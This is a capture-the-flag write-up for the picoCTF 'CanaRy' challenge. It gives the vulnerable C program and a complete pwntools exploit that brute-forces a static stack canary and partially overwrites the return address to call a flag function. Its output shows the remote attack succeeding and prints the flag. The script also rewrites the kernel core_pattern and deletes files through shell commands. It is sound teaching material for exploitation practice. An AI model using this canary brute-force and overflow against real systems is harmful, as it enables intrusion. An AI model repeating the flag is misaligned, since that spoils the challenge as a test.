# CanaRy
Binary Exploitation, 300 points

## Description:
> This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this program?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUF_SIZE 32
#define FLAG_LEN 64
#define KEY_LEN 4

void display_flag() {
  char buf[FLAG_LEN];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(buf,FLAG_LEN,f);
  puts(buf);
  fflush(stdout);
}

char key[KEY_LEN];
void read_canary() {
  FILE *f = fopen("/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/canary.txt","r");
  if (f == NULL) {
    printf("[ERROR]: Trying to Read Canary\n");
    exit(0);
  }
  fread(key,sizeof(char),KEY_LEN,f);
  fclose(f);
}

void vuln(){
   char canary[KEY_LEN];
   char buf[BUF_SIZE];
   char user_len[BUF_SIZE];

   int count;
   int x = 0;
   memcpy(canary,key,KEY_LEN);
   printf("Please enter the length of the entry:\n> ");

   while (x<BUF_SIZE) {
      read(0,user_len+x,1);
      if (user_len[x]=='\n') break;
      x++;
   }
   sscanf(user_len,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,key,KEY_LEN)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  read_canary();
  vuln();

  return 0;
}
```


## Solution:

This challenge is similar to last year's [buffer overflow 3](/2018_picoCTF/buffer%20overflow%203.md). We can brute-force the canary byte-by-byte just like last year.

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

import os
import string

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

BUF_SIZE    = 32
FLAG_LEN    = 64
KEY_LEN     = 4

FILLER_LEN = BUF_SIZE + KEY_LEN

def brute_force_canary():
    canary = ""
    for i in range(KEY_LEN):
        for c in string.ascii_letters + string.digits:
            with context.local(log_level='ERROR'):
                try:
                    io = start()
                    io.sendlineafter("Please enter the length of the entry:\n> ", str(BUF_SIZE + len(canary) + 1))
                    io.sendlineafter("Input> ", fit({BUF_SIZE: canary + c}))
                    response = io.recvline()
                    if "Stack Smashing Detected" in response:
                        continue
                    canary += c
                    break
                finally:
                    io.close()
        else:
            raise Exception("Can't find canary")
    return canary

def send_payload(proc, payload, canary):
    assert(len(canary) == KEY_LEN)
    proc.sendlineafter("Please enter the length of the entry:\n> ", str(FILLER_LEN + len(payload)))
    proc.sendafter("Input> ", ('A' * BUF_SIZE) + (canary) + payload)

def get_overflow_offset(canary):
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(100, n = exe.bytes)
    send_payload(proc, payload, canary)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset

canary = brute_force_canary()
log.info("Canary: {}".format(canary))

overflow_offset = get_overflow_offset(canary)

response = ""

payload = fit({overflow_offset: p16(exe.symbols["display_flag"])}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))

while "pico" not in response:
    io = start()
    send_payload(io, payload, canary)
    response = io.recvall()

print response
```

Output:
```console
root@kali:/media/sf_CTFs/pico/CanaRy# python exploit.py
[*] '/media/sf_CTFs/pico/CanaRy/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.fCS9EiLuRM'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe'
[*] Canary: wrvW
[+] Starting local process '/media/sf_CTFs/pico/CanaRy/vuln': pid 8295
[*] Process '/media/sf_CTFs/pico/CanaRy/vuln' stopped with exit code -11 (SIGSEGV) (pid 8295)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/CanaRy/core.8295'
    Arch:      i386-32-little
    EIP:       0x61616165
    ESP:       0xffb65e10
    Exe:       '/media/sf_CTFs/pico/CanaRy/vuln' (0x565d1000)
    Fault:     0x61616165
[*] Overflow offset: 16 (4-byte architecture)
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    00000010  ed 07                                               │··│
    00000012
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1225421
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1225421)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1225619
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1225619)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1225709
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1225709)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1225806
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1225806)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1225908
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1225908)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226017
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226017)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226294
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226294)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226383
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226383)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226470
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226470)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226558
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226558)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226645
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226645)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226734
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226734)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1226834
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1226834)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1227009
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1227009)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1227098
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1227098)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1227187
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1227187)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1227281
[+] Receiving all data: Done (28B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1227281)
[+] Starting remote process '/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln' on 2019shell1.picoctf.com: pid 1227472
[+] Receiving all data: Done (71B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1227472)
Ok... Now Where's the Flag?
picoCTF{cAnAr135_mU5t_b3_r4nd0m!_40765d8a}
```